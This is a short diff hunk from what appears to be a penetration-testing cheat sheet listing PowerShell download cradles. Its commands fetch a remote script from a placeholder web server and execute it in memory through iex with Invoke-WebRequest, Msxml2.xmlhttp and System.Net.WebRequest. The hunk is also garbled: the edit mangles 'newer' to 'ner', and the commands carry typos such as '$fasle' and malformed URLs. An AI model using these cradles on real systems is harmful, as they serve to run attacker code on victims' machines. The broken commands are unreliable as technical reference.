@@ -142,13 +142,12 @@ $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.na
 ```
 {% endcode %}
 
-#### **PSv3 or newer**
+#### **PSv3 or ner**
 
 {% code overflow="wrap" %}
 ```powershell
 i Iex (iwr '
-http://websever/ps.ps1
-') -iwr is alias for invoke-web request
+http://websever/ps.ps1') -iwr is alias for invoke-web request
  $h=New-Object -ComObject
 Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.responseText
 $wr = [System.NET.WebRequest]::Create("http://werbser.ps.ps1")
